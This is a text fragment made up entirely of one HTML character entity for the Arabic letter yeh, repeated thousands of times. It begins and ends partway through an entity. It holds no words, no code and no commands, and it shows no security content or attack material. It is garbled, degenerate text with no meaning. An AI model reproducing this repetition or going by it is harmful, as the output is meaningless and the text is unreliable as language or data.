CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x